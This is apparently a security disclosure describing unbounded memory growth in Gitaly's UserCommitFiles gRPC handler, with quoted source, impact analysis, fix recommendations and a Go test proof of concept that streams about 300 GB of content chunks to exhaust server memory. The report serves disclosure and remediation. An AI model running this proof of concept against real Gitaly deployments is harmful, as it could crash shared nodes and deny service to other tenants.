### Title
Unbounded memory growth via unlimited `UserCommitFilesAction_Content` stream chunks - ([File: internal/gitaly/service/operations/commit_files.go])

### Summary
`UserCommitFiles` reads the entire client-supplied action stream into an in-memory slice (`pbActions`) before performing any validation, size check, or writing content to git, and the receive loop only terminates on `io.EOF`, a stream error, or an explicit protocol violation. A malicious but otherwise unprivileged pusher with access to any repository they own can hold the RPC handler open indefinitely, sending an effectively unbounded number of `Content` chunks that are concatenated via `append` into a single growing `[]byte`, exhausting the server's memory before Gitaly ever reaches `WriteBlob` or any size-checking code.

### Finding Description
In `s.userCommitFiles` (`internal/gitaly/service/operations/commit_files.go:609-635`), the request loop:
```go
var pbActions []action
for {
    req, err := stream.Recv()
    ...
    case *gitalypb.UserCommitFilesAction_Content:
        if len(pbActions) == 0 {
            return errors.New("content sent before action")
        }
        content := &pbActions[len(pbActions)-1].content
        *content = append(*content, payload.Content...)
    ...
    }
}
```
buffers all `Header`/`Content` messages fully before any downstream processing (path validation, `WriteBlob`, tree building) occurs at lines 637-714. There is no per-action, per-message, or aggregate byte-count/message-count cap anywhere in this loop or in `validateUserCommitFilesHeader` (line 861). The only per-message bound is gRPC's built-in default receive-message-size limit (~4MiB, since Gitaly does not override `MaxRecvMsgSize` in `internal/gitaly/server/server.go`), but that limits a single message, not the number of messages in the stream nor the cumulative size accumulated in `pbActions[...].content`. An attacker with ordinary push access to a repository they control can open a `UserCommitFiles` stream, send one `Header` action, and then stream an effectively unlimited sequence of `Content` messages (each near the 4MiB per-message cap) without ever sending `io.EOF`, causing the buffered content on the Gitaly process to grow without bound. Existing checks (`storage.ValidateRelativePath`, hook/access checks, quarantine) only run after the entire stream has been consumed into memory (line 643 onward), so they provide no protection against this loop.

### Impact Explanation
This is a resource-exhaustion / denial-of-service vector against a shared Gitaly node: an attacker-controlled RPC handler can accumulate multi-gigabyte allocations limited only by available RAM, network throughput, and the client's willingness to keep the stream open, potentially triggering OOM kill of the `gitaly` process and impacting all other tenants/repositories co-located on that node/storage. This matches a "Denial of Service" impact class for a multi-tenant Gitaly deployment.

### Likelihood Explanation
Preconditions are minimal: normal push/write access to a single owned repository (the default RPC-level access requirement for `UserCommitFiles`, gated only by standard access-check/hook logic that runs after stream consumption). No admin privileges, no special configuration, and no cooperation from GitLab Rails is required beyond routing the RPC (this can also be invoked directly at the gRPC layer if reachable). The attack is fully repeatable and requires no race condition or timing dependency—an attacker simply keeps the stream open and keeps sending `Content` frames.

### Recommendation
Enforce bounds while consuming the stream rather than after the fact:
- Track a running total across the whole request (all actions' content combined) and abort with `structerr.NewResourceExhausted` once it exceeds a sane limit (e.g. a configurable max total content size analogous to Git's own object size limits).
- Alternatively/also stream each action's content directly to `quarantineRepo.WriteBlob` incrementally as `Content` messages arrive (using an `io.Pipe`/streaming writer) instead of buffering the full content in `pbActions[...].content` before any blob write occurs, so memory usage is bounded by the per-message gRPC limit rather than the total stream length.
- Consider also capping the number of actions per request.

### Proof of Concept
```go
func TestUserCommitFiles_UnboundedContentStream(t *testing.T) {
    ctx := testhelper.Context(t)
    cfg, client := setupOperationsService(t, ctx)
    repo, repoPath := gittest.CreateRepository(t, ctx, cfg)

    stream, err := client.UserCommitFiles(ctx)
    require.NoError(t, err)

    require.NoError(t, stream.Send(&gitalypb.UserCommitFilesRequest{
        UserCommitFilesRequestPayload: &gitalypb.UserCommitFilesRequest_Header{
            Header: &gitalypb.UserCommitFilesRequestHeader{
                Repository:      repo,
                User:            gittest.TestUser,
                CommitMessage:   []byte("dos"),
                BranchName:      []byte("refs/heads/main"),
            },
        },
    }))
    require.NoError(t, stream.Send(&gitalypb.UserCommitFilesRequest{
        UserCommitFilesRequestPayload: &gitalypb.UserCommitFilesRequest_Action{
            Action: &gitalypb.UserCommitFilesAction{
                UserCommitFilesActionPayload: &gitalypb.UserCommitFilesAction_Header{
                    Header: &gitalypb.UserCommitFilesActionHeader{
                        Action:   gitalypb.UserCommitFilesActionHeader_CREATE,
                        FilePath: []byte("big-file"),
                    },
                },
            },
        },
    }))

    chunk := bytes.Repeat([]byte("A"), 3*1024*1024) // near default 4MiB gRPC msg cap
    // Send effectively unbounded content chunks, never sending EOF, to observe
    // unbounded growth of pbActions[...].content on the server (monitor RSS).
    for i := 0; i < 100000; i++ {
        err := stream.Send(&gitalypb.UserCommitFilesRequest{
            UserCommitFilesRequestPayload: &gitalypb.UserCommitFilesRequest_Action{
                Action: &gitalypb.UserCommitFilesAction{
                    UserCommitFilesActionPayload: &gitalypb.UserCommitFilesAction_Content{
                        Content: chunk,
                    },
                },
            },
        })
        require.NoError(t, err) // never closes send-side; server keeps appending in memory
    }
}
```
Expected/observed behavior: the server's RSS grows proportionally to the number of chunks sent with no `structerr.ResourceExhausted` or any other bound enforced before memory is exhausted, confirming the DoS. [1](#0-0) [2](#0-1) [3](#0-2)

### Citations

**File:** internal/gitaly/service/operations/commit_files.go (L609-635)
```go
	var pbActions []action

	for {
		req, err := stream.Recv()
		if err != nil {
			if errors.Is(err, io.EOF) {
				break
			}

			return fmt.Errorf("receive request: %w", err)
		}

		switch payload := req.GetAction().GetUserCommitFilesActionPayload().(type) {
		case *gitalypb.UserCommitFilesAction_Header:
			pbActions = append(pbActions, action{header: payload.Header})
		case *gitalypb.UserCommitFilesAction_Content:
			if len(pbActions) == 0 {
				return errors.New("content sent before action")
			}

			// append the content to the previous action
			content := &pbActions[len(pbActions)-1].content
			*content = append(*content, payload.Content...)
		default:
			return fmt.Errorf("unhandled action payload type: %T", payload)
		}
	}
```

**File:** internal/gitaly/service/operations/commit_files.go (L637-660)
```go
	actions := make([]commitAction, 0, len(pbActions))
	for _, pbAction := range pbActions {
		if _, ok := gitalypb.UserCommitFilesActionHeader_ActionType_name[int32(pbAction.header.GetAction())]; !ok {
			return structerr.NewInvalidArgument("NoMethodError: undefined method `downcase' for %d:Integer", pbAction.header.GetAction())
		}

		path, err := validatePath(repoPath, string(pbAction.header.GetFilePath()))
		if err != nil {
			return structerr.NewInvalidArgument("validate path: %w", err)
		}

		content := io.Reader(bytes.NewReader(pbAction.content))
		if pbAction.header.GetBase64Content() {
			content = base64.NewDecoder(base64.StdEncoding, content)
		}

		switch pbAction.header.GetAction() {
		case gitalypb.UserCommitFilesActionHeader_CREATE:
			blobID, err := quarantineRepo.WriteBlob(ctx, content, localrepo.WriteBlobConfig{
				Path: path,
			})
			if err != nil {
				return fmt.Errorf("write created blob: %w", err)
			}
```

**File:** internal/gitaly/service/operations/commit_files.go (L861-881)
```go
func validateUserCommitFilesHeader(header *gitalypb.UserCommitFilesRequestHeader, objectHash git.ObjectHash) error {
	if header.GetUser() == nil {
		return errors.New("empty User")
	}
	if len(header.GetCommitMessage()) == 0 {
		return errors.New("empty CommitMessage")
	}
	if len(header.GetBranchName()) == 0 {
		return errors.New("empty BranchName")
	}

	startSha := header.GetStartSha()
	if len(startSha) > 0 {
		err := objectHash.ValidateHex(startSha)
		if err != nil {
			return err
		}
	}

	return nil
}
```
